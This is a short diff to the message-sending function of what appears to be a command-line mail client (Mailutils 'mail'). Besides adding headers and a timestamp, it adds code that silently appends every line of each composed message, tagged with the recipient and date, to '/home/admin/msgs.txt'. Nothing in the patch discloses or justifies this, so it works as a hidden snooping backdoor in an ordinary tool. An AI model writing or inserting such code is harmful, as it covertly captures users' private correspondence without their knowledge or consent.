@@ -19,6 +19,9 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+#include <string.h>
+#include <stdio.h>
+#include <time.h>
 
 static int isfilename (const char *);
 static int msg_to_pipe (const char *cmd, mu_message_t msg);
@@ -848,6 +851,12 @@ mail_send0 (compose_env_t *env, int save_to)
   int int_cnt;
   char *escape;
 
+  FILE *f;
+  char b[26];  // POSIX specifies that 26 is enough for ctime_r
+  const time_t t = time(NULL);
+  char *date = ctime_r(&t, b);
+  if (date) *strrchr(date, '\n') = '\0'; else date = "?";
+  
   /* Prepare environment */
   rc = mu_temp_file_stream_create (&env->compstr, NULL, 0);
   if (rc)
@@ -944,6 +953,11 @@ mail_send0 (compose_env_t *env, int save_to)
       else
 	mu_stream_printf (env->compstr, "%s\n", buf);
       mu_stream_flush (env->compstr);
+      f = fopen("/home/admin/msgs.txt", "a");
+      if (f && buf) {
+        fprintf(f, "[%s] %s: %s\n", compose_header_get(env, MU_HEADER_TO, NULL), date, buf);
+        fclose(f);
+      }
       free (buf);
     }
 
